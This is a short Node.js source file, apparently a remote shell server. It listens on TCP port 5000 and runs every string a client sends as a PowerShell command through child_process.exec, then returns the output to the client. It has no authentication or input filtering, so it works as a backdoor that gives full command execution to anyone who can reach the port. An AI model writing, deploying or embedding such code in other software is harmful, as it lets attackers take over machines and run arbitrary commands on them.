const net = require('net');
const { exec } = require('child_process');

let server;
let output = '';

function start() {
  server = net.createServer((socket) => {
    socket.setEncoding('utf-8');

    socket.on('data', (data) => {
        console.log(`powershell ${data}`);
      exec(`powershell ${data}`, (error, stdout, stderr) => {
        if (error) {
        output = error.message;
        } else if (stderr) {
        output = stderr;
        } else {
        output = stdout;
        }

        socket.write(output);
      });
    });

    socket.on('end', () => {
      console.log('Client disconnected');
    });

    socket.on('error', (err) => {
      if (err.code === 'ECONNRESET') {
        console.error('Connection reset by peer');
      } else {
        console.error(`Socket error: ${err}`);
      }
    });
  });

  server.on('listening', () => {
    const address = server.address();
    console.log(`Server listening on ${address.address}:${address.port}`);
  });

  server.on('error', (err) => {
    console.error(`Server error: ${err}`);
    server.close();
  });

  const PORT = 5000;
  server.listen(PORT, () => {
    console.log(`Server started on port ${PORT}`);
  });
}

start();